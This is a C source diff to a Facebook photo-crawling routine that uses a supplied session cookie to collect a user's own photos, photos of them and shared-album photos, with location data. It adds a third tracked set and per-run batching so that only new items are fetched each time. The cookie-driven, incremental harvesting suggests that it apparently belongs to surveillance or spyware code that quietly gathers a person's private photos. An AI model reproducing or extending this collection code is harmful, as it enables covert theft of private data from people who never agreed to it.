@@ -40,6 +40,7 @@ typedef struct _facebook_photo_id {
 	UINT64	fbid;			// key
 #define PHOTOS_YOURS	0
 #define PHOTOS_OF_YOU	1
+#define PHOTOS_ALBUM    2  // hack for shared album fbid order problem
 	DWORD   dwType;			
 	UT_hash_handle hh;		// handle
 } facebook_photo_id;
@@ -1166,7 +1167,7 @@ VOID FacebookPhotoCrawlAlbums(__in LPSTR strCookie, __in LPSTR strUserId, __in L
 			if (dwRet != SOCIAL_REQUEST_SUCCESS)
 				break;
 
-			FacebookPhotoExtractFbidsFromPage(strRecvThisAlbumBuffer, hash_head, PHOTOS_YOURS);
+			FacebookPhotoExtractFbidsFromPage(strRecvThisAlbumBuffer, hash_head, PHOTOS_ALBUM);
 			
 			zfree_s(strRecvThisAlbumBuffer);
 		}
@@ -1437,14 +1438,20 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
-	/* 1] Photos of You */
-	FacebookPhotoCrawlPhotosOfYou(strCookie, strUserId, strRecvBuffer, &hash_head);
-
-	/* 2] Your Photos */
+	
+	/* 1] Your Photos */
+	// N.B.:
+	// - must stay on top, since it will avoid any clash with fbids
 	FacebookPhotoCrawlYourPhotos(strCookie, strUserId, strRecvBuffer, &hash_head);
 
+	/* 2] Photos of You */
+	FacebookPhotoCrawlPhotosOfYou(strCookie, strUserId, strRecvBuffer, &hash_head);
+
 	/* 3] Albums */
-	// photos from album managed by two users are found only in Albums
+	// photos from album managed by two users are found only in Albums, 
+	// N.B.:
+	// - it must follow "Your Photos"
+	// - some photos posted by other users sharing an album might be missing
 	FacebookPhotoCrawlAlbums(strCookie, strUserId, strRecvBuffer, &hash_head);
 	
 
@@ -1461,22 +1468,26 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 
 	// 0 -> PHOTOS_YOURS
 	// 1 -> PHOTOS_OF_YOU
-	DWORD dwMaxItemsPerRun_0 = 30, dwMaxItemsPerRun_1 = 30;
-	DWORD dwCurrentItemsPerRun_0 = 0, dwCurrentItemsPerRun_1 = 0;
-	UINT64 highestBatchFbid_0 = 0, highestBatchFbid_1 = 0;
+	// 2 -> PHOTOS_ALBUM
+	DWORD dwMaxItemsPerRun_0 = 30, dwMaxItemsPerRun_1 = 30, dwMaxItemsPerRun_2 = 30;
+	DWORD dwCurrentItemsPerRun_0 = 0, dwCurrentItemsPerRun_1 = 0, dwCurrentItemsPerRun_2 = 0;
+	UINT64 highestBatchFbid_0 = 0, highestBatchFbid_1 = 0, highestBatchFbid_2 = 0;
 
 	size_t strUsernameSize = strlen(strUserId) + strlen("_photos_1") + 1;
 	LPSTR strSocialUsername_0 = (LPSTR) zalloc_s(strUsernameSize);
 	LPSTR strSocialUsername_1 = (LPSTR) zalloc_s(strUsernameSize);
+	LPSTR strSocialUsername_2 = (LPSTR) zalloc_s(strUsernameSize);
 
-	if (strSocialUsername_0 && strSocialUsername_1)
+	if (strSocialUsername_0 && strSocialUsername_1 && strSocialUsername_2)
 	{
 		_snprintf_s(strSocialUsername_0, strUsernameSize, _TRUNCATE, "%s_photos_0", strUserId);
 		_snprintf_s(strSocialUsername_1, strUsernameSize, _TRUNCATE, "%s_photos_1", strUserId);
+		_snprintf_s(strSocialUsername_2, strUsernameSize, _TRUNCATE, "%s_photos_2", strUserId);
 
-		// get saved highest timestamp  for both the sets
+		// get saved highest timestamp  for the three sets
 		UINT64 savedHighestBatchFbid_0 = SocialGetLastMessageId(strSocialUsername_0);
 		UINT64 savedHighestBatchFbid_1 = SocialGetLastMessageId(strSocialUsername_1);
+		UINT64 savedHighestBatchFbid_2 = SocialGetLastMessageId(strSocialUsername_2);
 		
 
 		// loop through the 2 sets and select the candidates for each set, i.e. filter
@@ -1516,7 +1527,21 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 						highestBatchFbid_1 = fbid_current->fbid;
 				}
 			}
+			// set PHOTOS_ALBUM
+			else if (fbid_current->dwType == PHOTOS_ALBUM)
+			{
+				if (fbid_current->fbid > savedHighestBatchFbid_2 && 
+					dwCurrentItemsPerRun_2 < dwMaxItemsPerRun_2 )
+				{
+					// handle the photo
+					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current,  idToLocation_hash_head);
+					dwCurrentItemsPerRun_2 +=1;
 
+					// update highest batch fbid in case
+					if (fbid_current->fbid > highestBatchFbid_2)
+						highestBatchFbid_2 = fbid_current->fbid;
+				}
+			}
 		
 			// remove the photo from the hash
 			HASH_DEL(hash_head, fbid_current);
@@ -1530,6 +1555,8 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 		if (highestBatchFbid_1 > savedHighestBatchFbid_1)
 			SocialSetLastMessageId(strSocialUsername_1, highestBatchFbid_1 );
 	
+		if (highestBatchFbid_2 > savedHighestBatchFbid_2)
+			SocialSetLastMessageId(strSocialUsername_2, highestBatchFbid_2 );
 
 		// free facebook_placeId_to_location *idToLocation
 		facebook_placeId_to_location *placeId_tmp, *placeId_current;
@@ -1542,6 +1569,7 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 
 		zfree_s(strSocialUsername_0);
 		zfree_s(strSocialUsername_1);
+		zfree_s(strSocialUsername_2);
 	}
 	
 
